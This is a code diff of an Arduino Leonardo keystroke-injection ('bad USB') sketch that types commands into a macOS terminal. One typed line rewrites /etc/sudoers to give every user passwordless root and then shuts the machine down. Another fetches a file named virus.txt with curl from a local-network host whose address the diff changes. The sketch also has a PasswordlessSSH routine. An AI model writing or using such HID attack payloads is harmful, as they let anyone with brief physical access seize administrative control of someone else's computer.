@@ -1,4 +1,3 @@
-#include <phukdlib_leonardo.h>
   
   void PasswordlessSSH() {
   delay(3000);
@@ -20,7 +19,7 @@
 
 void EasySudo(){
   delay(3000);
-  CommandAtRunBarOSX("terminal");
+//  CommandAtRunBarOSX("terminal");
   delay(3000);
   Keyboard.println("mount -uw / && chmod 755 /etc/sudoers && echo 'ALL    ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers && chmod 440 /etc/sudoers && shutdown -h now");
   delay(3000);
@@ -29,9 +28,9 @@ void EasySudo(){
 
 void Command(){
   delay(5000);
-  CommandAtRunBarOSX("terminal");
+  //CommandAtRunBarOSX("terminal");
   delay(3000);
-  Keyboard.println("curl http://192.168.1.210 > virus.txt");
+  Keyboard.println("curl http://192.168.1.229 > virus.txt");
   delay(2000);
   Keyboard.println("less virus.txt");
   while(1);
